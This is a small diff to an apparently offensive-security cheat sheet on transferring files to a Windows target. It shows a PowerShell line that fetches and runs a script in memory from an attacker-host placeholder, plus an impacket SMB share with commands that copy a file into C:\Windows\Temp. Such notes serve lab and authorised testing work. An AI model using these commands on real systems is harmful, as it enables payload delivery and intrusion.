@@ -32,8 +32,9 @@ A PowerShell script, straight into memory:
 iex (iwr -UseBasicParsing http://<LHOST>:8000/<File>)
 
 ## An SMB share from Kali
-At the pwn-broker prompt: tool install impacket. Use the full path with sudo, which does not search pwn-broker's bin folder.
+At the pwn-broker prompt: tool install impacket.
 sudo /opt/pwn-broker/bin/impacket-smbserver share "$(pwd)" -smb2support -username kali -password kali
+- [ ] The full path with sudo: a bare sudo impacket-smbserver does not use pwn-broker's bin folder
 On the target:
 net use \\<LHOST>\share /user:kali kali
 copy \\<LHOST>\share\<File> C:\Windows\Temp\
